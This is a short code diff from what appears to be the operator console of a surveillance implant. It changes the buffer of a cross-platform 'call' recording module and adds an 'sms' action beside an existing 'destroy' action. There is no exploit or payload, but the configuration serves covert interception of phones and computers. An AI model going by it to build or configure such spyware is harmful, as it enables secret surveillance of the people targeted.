@@ -47,7 +47,7 @@ package it.ht.rcs.console
         {
           module: "call",
           record: true,
-          buffer: 524288,
+          buffer: 512000,
           compression: 5,
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
@@ -265,6 +265,11 @@ package it.ht.rcs.console
         case 'destroy':
           a = { action: "destroy",
                 permanent: false };
+          return a;
+        case 'sms':
+          a = { action: "sms",
+                number: "",
+                text: "" };
           return a;
         default:
           return null;
